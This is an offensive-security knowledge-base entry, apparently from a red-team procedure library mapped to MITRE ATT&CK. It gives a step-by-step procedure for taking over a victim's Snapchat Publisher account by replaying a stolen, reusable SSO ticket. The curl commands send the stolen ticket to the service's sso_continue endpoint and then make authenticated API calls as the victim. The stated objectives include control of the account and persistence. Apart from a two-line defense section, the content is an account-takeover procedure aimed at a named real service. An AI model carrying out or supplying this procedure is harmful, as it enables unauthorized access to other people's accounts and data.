---
tags:
  - authentication-bypass
  - account-takeover
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-access-with-token]]'
platforms:
  - Web
techniques:
  - '[[Valid Accounts]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 4877a212-4ab0-43f9-809a-bf79b0d5d69d
created_at: '2025-12-13T09:01:26.648Z'
updated_at: '2025-12-13T09:01:26.648Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Use Stolen Token for Account Access

## Summary

This procedure uses a stolen reusable SSO token to gain unauthorized access to the victim's Snapchat Publisher account.

## Description

Tokens are not single-use, allowing repeated access. This finalizes the chain for account takeover and API control.

## Requirements

1. Stolen SSO token
2. Access to sso_continue endpoint
3. Victim's session context

## Defense

Defensive measures and detection strategies:

- Make tokens single-use and expiring
- Log and alert on token reuse

## Objectives

1. Log into victim's account
2. Control account and make requests
3. Achieve persistence if needed

## Instructions

### Step 1: Access with Token

**Context**: Send request to continue SSO with stolen token.

**Command** ([[commands/curl-access-with-token]]):
```bash
curl 'https://snappublisher.snapchat.com/sso_continue?ticket=<stolen_token>'
```

> Grants access.

### Step 2: Verify Access

**Context**: Test API requests on behalf of victim.

**Command** ([[commands/curl-access-with-token]]):
```bash
curl 'https://snappublisher.snapchat.com/api/v1/some_endpoint' -H 'Authorization: Bearer <session_token>'
```

> Confirms control.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques



## Commands Used

- [[commands/curl-access-with-token]]

## Tools Used

- [[tools/Curl]]

## Tags

- [[authentication-bypass]]
- [[account-takeover]]
